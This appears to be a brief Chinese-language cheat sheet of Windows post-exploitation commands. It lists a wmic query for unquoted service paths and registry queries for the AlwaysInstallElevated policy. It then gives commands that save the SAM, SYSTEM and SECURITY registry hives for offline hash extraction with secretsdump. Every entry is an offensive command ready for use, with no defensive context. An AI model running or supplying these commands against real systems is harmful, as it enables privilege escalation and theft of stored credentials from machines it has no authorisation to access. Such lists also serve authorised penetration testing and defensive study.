title: 服务权限与未引用路径
cmd: wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

title: AlwaysInstallElevated 检查
cmd: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

title: 凭据提取（SAM / LSA）
cmd: reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM system.hiv & reg save HKLM\SECURITY security.hiv
note: 导出后本地用 secretsdump 解析
